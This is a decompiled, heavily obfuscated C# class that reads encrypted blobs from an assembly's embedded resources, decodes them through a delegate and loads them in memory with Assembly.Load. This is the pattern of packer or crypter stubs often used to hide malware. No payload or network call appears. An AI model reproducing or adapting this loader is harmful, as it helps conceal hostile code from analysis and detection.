using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;

public class GClass2
{
	public delegate bool GDelegate0(ref byte[] Payload);

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Assembly assembly_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Assembly assembly_1;

	private List<Type> list_0 = null;

	private const char char_0 = '.';

	private const int int_0 = 16;

	private const uint uint_0 = 65535u;

	private const uint uint_1 = 4294901760u;

	public Assembly Assembly_0
	{
		[CompilerGenerated]
		get
		{
			return assembly_0;
		}
		[CompilerGenerated]
		set
		{
			assembly_0 = value;
		}
	}

	public Assembly Assembly_1
	{
		[CompilerGenerated]
		get
		{
			return assembly_1;
		}
		[CompilerGenerated]
		private set
		{
			assembly_1 = value;
		}
	}

	private int method_0(uint uint_2, uint uint_3)
	{
		uint num4 = default(uint);
		uint num3 = default(uint);
		int result = default(int);
		while (true)
		{
			int num = 265711003;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6335E61Du) % 4u)
				{
				case 2u:
					num4 = uint_2 & 0xFFFFu;
					num3 = (uint_3 << 16) & 0xFFFF0000u;
					num = (int)(num2 * 2078096277) ^ -535417930;
					continue;
				case 1u:
					result = (int)(num3 | num4);
					num = ((int)num2 * -1112387008) ^ 0x6DF2D9F5;
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void method_1(GDelegate0 gdelegate0_0)
	{
		bool flag = default(bool);
		string text = default(string);
		byte[] Payload = default(byte[]);
		string[] manifestResourceNames = default(string[]);
		int num3 = default(int);
		while (true)
		{
			int num = -512033636;
			while (true)
			{
				int num8;
				uint num2;
				switch ((num2 = (uint)num ^ 0x87DFA7BCu) % 7u)
				{
				case 6u:
					flag = text.IndexOf('.') >= 0;
					num = ((int)num2 * -1565849231) ^ 0x3E4A98DC;
					continue;
				case 5u:
					num = (int)(num2 * 1448351513) ^ -21238907;
					continue;
				default:
				{
					Stream manifestResourceStream = Assembly_0.GetManifestResourceStream(text);
					try
					{
						BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
						try
						{
							while (true)
							{
								IL_00ea:
								int num4 = -1138251953;
								while (true)
								{
									switch ((num2 = (uint)num4 ^ 0x87DFA7BCu) % 6u)
									{
									case 5u:
										Assembly_1 = Assembly.Load(Payload);
										num4 = (int)(num2 * 1926334084) ^ -477889900;
										continue;
									case 1u:
									{
										Payload = binaryReader.ReadBytes(method_0(binaryReader.ReadUInt32(), binaryReader.ReadUInt32()));
										int num5;
										int num6;
										if (!gdelegate0_0(ref Payload))
										{
											num5 = 1148690782;
											num6 = 1148690782;
										}
										else
										{
											num5 = 1554076331;
											num6 = 1554076331;
										}
										num4 = num5 ^ ((int)num2 * -1590093532);
										continue;
									}
									case 0u:
										num4 = -1862535720;
										continue;
									default:
										goto end_IL_00c1;
									case 3u:
										break;
									case 2u:
										return;
									case 4u:
										goto end_IL_00c1;
									}
									goto IL_00ea;
									continue;
									end_IL_00c1:
									break;
								}
								break;
							}
						}
						finally
						{
							if (binaryReader != null)
							{
								while (true)
								{
									IL_0142:
									int num7 = -2008396807;
									while (true)
									{
										switch ((num2 = (uint)num7 ^ 0x87DFA7BCu) % 4u)
										{
										case 1u:
											((IDisposable)binaryReader).Dispose();
											num7 = ((int)num2 * -1808847705) ^ -573195893;
											continue;
										case 0u:
											num7 = ((int)num2 * -2094635693) ^ -46209246;
											continue;
										default:
											goto end_IL_0121;
										case 3u:
											break;
										case 2u:
											goto end_IL_0121;
										}
										goto IL_0142;
										continue;
										end_IL_0121:
										break;
									}
									break;
								}
							}
						}
					}
					catch
					{
						goto IL_0156;
					}
					goto IL_0191;
				}
				case 1u:
					text = manifestResourceNames[num3];
					num = -1844078831;
					continue;
				case 2u:
					manifestResourceNames = Assembly_0.GetManifestResourceNames();
					num3 = 0;
					goto IL_0161;
				case 0u:
					if (flag)
					{
						num = (int)(num2 * 585196423) ^ -910785408;
						continue;
					}
					goto IL_014f;
				case 3u:
					break;
					IL_0156:
					num3++;
					num8 = -663362058;
					goto IL_016c;
					IL_016c:
					switch ((num2 = (uint)num8 ^ 0x87DFA7BCu) % 5u)
					{
					case 4u:
						break;
					case 2u:
						goto IL_0156;
					case 0u:
						goto IL_0161;
					default:
						return;
					case 3u:
						goto IL_0191;
					case 1u:
						return;
					}
					goto IL_014f;
					IL_0191:
					num8 = -1560209052;
					goto IL_016c;
					IL_0161:
					if (num3 >= manifestResourceNames.Length)
					{
						num8 = -702334504;
						goto IL_016c;
					}
					goto case 1u;
					IL_014f:
					num8 = -1039943436;
					goto IL_016c;
				}
				break;
			}
		}
	}

	public Type method_2(int int_1)
	{
		Type result = default(Type);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1232108419;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9E5FF4AEu) % 11u)
				{
				case 10u:
					num = ((int)num2 * -1613584987) ^ -1501077379;
					continue;
				case 9u:
					num = ((int)num2 * -686668455) ^ 0x4E8BAA5E;
					continue;
				case 7u:
					list_0 = new List<Type>(Assembly_1.GetTypes());
					num = (int)(num2 * 1626279411) ^ -1786316488;
					continue;
				case 6u:
					result = list_0[int_1];
					num = ((int)num2 * -389407118) ^ -1969328014;
					continue;
				case 5u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = 1717581629;
						num6 = 1717581629;
					}
					else
					{
						num5 = 1074762089;
						num6 = 1074762089;
					}
					num = num5 ^ ((int)num2 * -1013728649);
					continue;
				}
				case 4u:
					result = null;
					num = -20958247;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -2011491314;
						num4 = -2011491314;
					}
					else
					{
						num3 = -1561271527;
						num4 = -1561271527;
					}
					num = num3 ^ (int)(num2 * 842644038);
					continue;
				}
				case 1u:
					flag2 = list_0 == null;
					num = ((int)num2 * -1361635119) ^ -1321071567;
					continue;
				case 0u:
					flag = list_0 != null;
					num = -281317934;
					continue;
				case 8u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}
}
